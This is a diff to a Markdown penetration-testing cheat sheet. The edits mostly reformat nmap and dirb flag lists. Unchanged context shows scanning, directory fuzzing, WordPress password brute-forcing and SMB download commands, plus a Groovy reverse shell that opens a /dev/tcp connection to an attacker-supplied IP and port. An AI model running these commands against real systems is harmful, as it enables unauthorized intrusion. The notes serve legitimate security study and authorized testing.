@@ -8,7 +8,6 @@
    * [Services](#Services)
         * [Most common ports](#Most-common-ports)
         * [Port Scanning Nmap](#port-scanning-Nmap)
-        * [Tips & Tricks](#Tips-and-Tricks)
    * [Web-applications](#Web-applications)
 * [Exploitation](#Exploitation)
    * [Web application](#Exploitation-Web-application)
@@ -166,12 +165,9 @@ nmap <TARGET> -p- --script vuln -vv -oA vulnscan_-<TARGET>
 ```
 
 #### Usefull flags
-```
--Pn No ping #use if host says down but you know its up)
--sn No port scan #use if you just want to scan a range to check if hosts are up.
-```
+- ```-Pn``` No ping #use if host says down but you know its up)
+- ```-sn``` No port scan #use if you just want to scan a range to check if hosts are up.
 
-### Enumeration Tips
 #### HTTP Openproxy
 If there is an open HTTP proxy, connect to it by configuring a proxy in your browser.
 
@@ -210,7 +206,6 @@ nikto -host <URL> -output nikto-URL.txt
 ```
 
 ### Directory fuzzing
-Directory fuzzing is used to fuzz directories on a website.
 #### Directory fuzzing - Dirb
 Use the -R to disable recursive scanning
 ```
@@ -226,10 +221,9 @@ gobuster dir -w /opt/SecLists/Discovery/Web-Content/big.txt -u <URL> gobuster-<U
 ```
 
 #### Usefull flags Dirb
-```
--p set up a proxy <IP:PORT>
--X Append each word with this extensions.
-```
+- ```-p``` set up a proxy <IP:PORT>
+- ```-X``` Append each word with this extensions.
+
 
 ### Wordpress
 #### Scan Wordpress
@@ -257,7 +251,6 @@ wpscan --url <URL> --usernames <USERNAME> --passwords /usr/share/wordlists/rocky
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
-
 ```
 
 ### SMTP
@@ -293,6 +286,7 @@ smbclient //<IP>/<SHARE>
 
 #### Download smb files recursively
 ```
+get <FILE NAME>-
 smbget -R smb://<IP>/<SHARE>
 ```
 
